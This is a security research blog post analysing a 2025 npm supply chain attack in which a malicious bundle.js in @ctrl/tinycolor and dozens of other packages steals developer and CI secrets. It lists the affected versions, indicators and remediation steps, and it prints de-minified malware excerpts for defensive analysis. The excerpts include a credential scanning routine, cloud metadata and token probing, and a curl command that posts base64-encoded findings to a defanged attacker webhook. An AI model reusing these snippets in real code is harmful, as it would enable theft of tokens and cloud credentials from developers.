---
title: "Popular Tinycolor npm Package Compromised in Supply Chain Attack Affecting 40+ Packages"
short_title: "Tinycolor npm Supply Chain Attack Affects 40+ Packages"
date: 2025-09-15 12:00:00 +0000
categories: [Supply Chain]
tags: [npm, Tinycolor, TruffleHog, Shai-Hulud, Developer Compromise, Infostealer, GitHub Actions, NativeScript]
author: socket_research_team
canonical_url: https://socket.dev/blog/tinycolor-supply-chain-attack-affects-40-packages
source: Socket
image:
  path: https://cdn.sanity.io/images/cgdhsj6q/production/49d370604c6ce2c65dce27fb2c22b9f388e30251-1022x558.png
  alt: "Tinycolor npm supply chain attack"
description: "Malicious update to @ctrl/tinycolor on npm is part of a supply-chain attack hitting 40+ packages across maintainers"
---

> Update (September 16, 2025): This campaign has expanded significantly. Our follow up documents nearly 500 affected npm packages, including several open source CrowdStrike packages. Read the latest analysis and guidance: [https://socket.dev/blog/ongoing-supply-chain-attack-targets-crowdstrike-npm-packages](https://socket.dev/blog/ongoing-supply-chain-attack-targets-crowdstrike-npm-packages)

A malicious update to `@ctrl/tinycolor` (2.2M weekly downloads) was detected on npm as part of a broader supply chain attack that impacted more than 40 packages spanning multiple maintainers.

The compromised versions include a function (`NpmModule.updatePackage`) that downloads a package tarball, modifies `package.json`, injects a local script (`bundle.js`), repacks the archive, and republishes it, enabling automatic trojanization of downstream packages.

The issue was first noticed by [Daniel dos Santos Pereira](https://www.linkedin.com/in/daniel-pereira-b17a27160/), who flagged suspicious behavior in the latest release. Socket's automated malware detection also surfaced the threat in 40+ additional packages, and our research team continues to analyze the payload and its distribution method. While tinycolor is the most visible package, with 2.2 million weekly downloads on npm, it did not originate these compromises, but is one package among dozens trojanized in this active campaign.

![Socket alert for compromised tinycolor package](https://cdn.sanity.io/images/cgdhsj6q/production/cd7bd69598078022c0cd3f02f507826a53350721-619x785.png)

### Compromised Packages and Versions

The following npm packages and versions have been confirmed as affected:

- [`angulartics2@14.1.2`](https://socket.dev/npm/package/angulartics2/files/14.1.2/bundle.js)
- [`@ctrl/deluge@7.2.2`](https://socket.dev/npm/package/@ctrl/deluge/files/7.2.2/bundle.js)
- [`@ctrl/golang-template@1.4.3`](https://socket.dev/npm/package/@ctrl/golang-template/files/1.4.3/bundle.js)
- [`@ctrl/magnet-link@4.0.4`](https://socket.dev/npm/package/@ctrl/magnet-link/files/4.0.4/bundle.js)
- [`@ctrl/ngx-codemirror@7.0.2`](https://socket.dev/npm/package/@ctrl/ngx-codemirror/files/7.0.2/bundle.js)
- [`@ctrl/ngx-csv@6.0.2`](https://socket.dev/npm/package/@ctrl/ngx-csv/files/6.0.2/bundle.js)
- [`@ctrl/ngx-emoji-mart@9.2.2`](https://socket.dev/npm/package/@ctrl/ngx-emoji-mart/files/9.2.2/bundle.js)
- [`@ctrl/ngx-rightclick@4.0.2`](https://socket.dev/npm/package/@ctrl/ngx-rightclick/files/4.0.2/bundle.js)
- [`@ctrl/qbittorrent@9.7.2`](https://socket.dev/npm/package/@ctrl/qbittorrent/files/9.7.2/bundle.js)
- [`@ctrl/react-adsense@2.0.2`](https://socket.dev/npm/package/@ctrl/react-adsense/files/2.0.2/bundle.js)
- [`@ctrl/shared-torrent@6.3.2`](https://socket.dev/npm/package/@ctrl/shared-torrent/files/6.3.2/bundle.js)
- [`@ctrl/tinycolor@4.1.1`](https://socket.dev/npm/package/@ctrl/tinycolor/overview/4.1.1), [`@4.1.2`](https://socket.dev/npm/package/@ctrl/tinycolor/overview/4.1.2)
- [`@ctrl/torrent-file@4.1.2`](https://socket.dev/npm/package/@ctrl/torrent-file/files/4.1.2/bundle.js)
- [`@ctrl/transmission@7.3.1`](https://socket.dev/npm/package/@ctrl/transmission/files/7.3.1/bundle.js)
- [`@ctrl/ts-base32@4.0.2`](https://socket.dev/npm/package/@ctrl/ts-base32/files/4.0.2/bundle.js)
- [`encounter-playground@0.0.5`](https://socket.dev/npm/package/encounter-playground/files/0.0.5/bundle.js)
- [`json-rules-engine-simplified@0.2.4`](https://socket.dev/npm/package/json-rules-engine-simplified/files/0.2.4/bundle.js), [`0.2.1`](https://socket.dev/npm/package/json-rules-engine-simplified/files/0.2.1/bundle.js)
- [`koa2-swagger-ui@5.11.2`](https://socket.dev/npm/package/koa2-swagger-ui/files/5.11.2/bundle.js), [`5.11.1`](https://socket.dev/npm/package/koa2-swagger-ui/files/5.11.1/bundle.js)
- [`@nativescript-community/gesturehandler@2.0.35`](https://socket.dev/npm/package/@nativescript-community/gesturehandler/files/2.0.35/bundle.js)
- [`@nativescript-community/sentry@4.6.43`](https://socket.dev/npm/package/@nativescript-community/sentry/overview/4.6.43)
- [`@nativescript-community/text@1.6.13`](https://socket.dev/npm/package/@nativescript-community/text/files/1.6.13/bundle.js)
- [`@nativescript-community/ui-collectionview@6.0.6`](https://socket.dev/npm/package/@nativescript-community/ui-collectionview/overview/6.0.6)
- [`@nativescript-community/ui-drawer@0.1.30`](https://socket.dev/npm/package/@nativescript-community/ui-drawer/files/0.1.30/bundle.js)
- [`@nativescript-community/ui-image@4.5.6`](https://socket.dev/npm/package/@nativescript-community/ui-image/files/4.5.6/bundle.js)
- [`@nativescript-community/ui-material-bottomsheet@7.2.72`](https://socket.dev/npm/package/@nativescript-community/ui-material-bottomsheet/files/7.2.72/bundle.js)
- [`@nativescript-community/ui-material-core@7.2.76`](https://www.notion.so/Popular-Tinycolor-npm-Package-Compromised-in-Supply-Chain-Attack-Affecting-40-Packages-26f4cb3adfeb8093af22d5f5acb0a531?pvs=21)
- [`@nativescript-community/ui-material-core-tabs@7.2.76`](https://socket.dev/npm/package/@nativescript-community/ui-material-core-tabs/files/7.2.76/bundle.js)
- [`ngx-color@10.0.2`](https://socket.dev/npm/package/ngx-color/files/10.0.2/bundle.js)
- [`ngx-toastr@19.0.2`](https://socket.dev/npm/package/ngx-toastr/files/19.0.2/bundle.js)
- [`ngx-trend@8.0.1`](https://socket.dev/npm/package/ngx-trend/files/8.0.1/bundle.js)
- [`react-complaint-image@0.0.35`](https://socket.dev/npm/package/react-complaint-image/files/0.0.35/bundle.js)
- [`react-jsonschema-form-conditionals@0.3.21`](https://socket.dev/npm/package/react-jsonschema-form-conditionals/files/0.3.21/bundle.js)
- [`react-jsonschema-form-extras@1.0.4`](https://socket.dev/npm/package/react-jsonschema-form-extras/files/1.0.4/bundle.js)
- [`rxnt-authentication@0.0.6`](https://socket.dev/npm/package/rxnt-authentication/files/0.0.6/bundle.js)
- [`rxnt-healthchecks-nestjs@1.0.5`](https://socket.dev/npm/package/rxnt-healthchecks-nestjs/files/1.0.5/bundle.js)
- [`rxnt-kue@1.0.7`](https://socket.dev/npm/package/rxnt-kue/files/1.0.7/bundle.js)
- [`swc-plugin-component-annotate@1.9.2`](https://socket.dev/npm/package/swc-plugin-component-annotate/files/1.9.2/bundle.js)
- [`ts-gaussian@3.0.6`](https://socket.dev/npm/package/ts-gaussian/files/3.0.6/bundle.js)

## Malware Analysis

The `bundle.js` script downloads and executes TruffleHog, a legitimate secret scanner, then searches the host for tokens and cloud credentials. It validates and uses developer and CI credentials, creates a GitHub Actions workflow inside repositories, and exfiltrates results to a hardcoded webhook (`hxxps://webhook[.]site/bb8ca5f6-4175-45d2-b042-fc9ebb8170b7`).

The script runs automatically when the package is installed.

![bundle.js install hook](https://cdn.sanity.io/images/cgdhsj6q/production/e00e84d58ab56de42809905f86cc8b4c2a7a8648-996x90.png)

The referenced `bundle.js` is a large, minified file that functions as a controller. It profiles the platform, fetches a matching TruffleHog binary, and searches for known credential patterns across the filesystem and repositories.

```javascript
// De-minified transcription from bundle.js
const { execSync } = require("child_process");
const os = require("os");

function trufflehogUrl() {
  const plat = os.platform();
  if (plat === "win32") return "hxxps://github[.]com/trufflesecurity/trufflehog/releases/download/.../trufflehog_windows_x86_64.zip";
  if (plat === "linux") return "hxxps://github[.]com/trufflesecurity/trufflehog/releases/download/.../trufflehog_linux_x86_64.tar.gz";
  return "hxxps://github[.]com/trufflesecurity/trufflehog/releases/download/.../trufflehog_darwin_all.tar.gz";
}

function runScanner(binaryPath, targetDir) {
  // Executes downloaded scanner against local paths
  const cmd = `"${binaryPath}" filesystem "${targetDir}" --json`;
  const out = execSync(cmd, { stdio: "pipe" }).toString();
  return JSON.parse(out); // Parsed findings contain tokens and secrets
}
```

The controller also includes a bash block that uses a GitHub personal access token if present, writes a GitHub Actions workflow into `.github/workflows`, and exfiltrates collected content to a webhook.

```sh
# Extracted from a literal script block inside bundle.js
FILE_NAME=".github/workflows/shai-hulud-workflow.yml"

# Minimal exfil step inside the generated workflow
# Note: defanged URL for safety
run: |
  CONTENTS="$(cat findings.json | base64 -w0)"
  curl -s -X POST -d "$CONTENTS" "hxxps://webhook[.]site/bb8ca5f6-4175-45d2-b042-fc9ebb8170b7"
```

### Stealing Secrets

The script combines local scanning with service specific probing. It looks for environment variables such as `GITHUB_TOKEN`, `NPM_TOKEN`, `AWS_ACCESS_KEY_ID`, and `AWS_SECRET_ACCESS_KEY`. It validates npm tokens with the `whoami` endpoint, and it interacts with GitHub APIs when a token is available. It also attempts cloud metadata discovery that can leak short lived credentials inside cloud build agents.

```javascript
// Key network targets inside the bundle
const imdsV4 = "http://169[.]254[.]169[.]254";          // AWS instance metadata
const imdsV6 = "http://[fd00:ec2::254]";                // AWS metadata over IPv6
const gcpMeta = "http://metadata[.]google[.]internal";  // GCP metadata

// npm token verification
fetch("https://registry.npmjs.org/-/whoami", {
  headers: { "Authorization": `Bearer ${process.env.NPM_TOKEN}` }
});

// GitHub API use if GITHUB_TOKEN is present
fetch("https://api.github.com/user", {
  headers: { "Authorization": `token ${process.env.GITHUB_TOKEN}` }
});
```

The workflow that it writes to repositories persists beyond the initial host. Once committed, any future CI run can trigger the exfiltration step from within the pipeline where sensitive secrets and artifacts are available by design.

### Additional Exfiltration

The payload aggregates findings into a local file named `data.json` before any outbound transfer. In addition to planting a workflow that posts {% raw %}`${{ toJSON(secrets) }}`{% endraw %} to `webhook[.]site`, the script can publish stolen data into public GitHub repositories created under the victim account, which mirrors patterns seen in the [Nx](https://socket.dev/blog/nx-supply-chain-attack-investigation-github-actions-workflow-exploit) [incident](https://socket.dev/blog/nx-packages-compromised). This route persists even if `webhook` egress is blocked, and it expands impact to any repositories reachable by the captured token.

### Indicators of Compromise

- `bundle.js` SHA-256: `46faab8ab153fae6e80e7cca38eab363075bb524edd79e42269217a083628f09`
- Exfiltration endpoint: `hxxps://webhook[.]site/bb8ca5f6-4175-45d2-b042-fc9ebb8170b7`

### Immediate Guidance

- **Uninstall or pin to known-good versions** until patched releases are verified.
- **Audit environments** (CI/CD agents, developer laptops) that installed the affected versions for unauthorized publishes or credential theft.
- **Rotate npm tokens and other exposed secrets** if these packages were present on machines with publishing credentials.
- Monitor logs for unusual `npm publish` or package modification events.
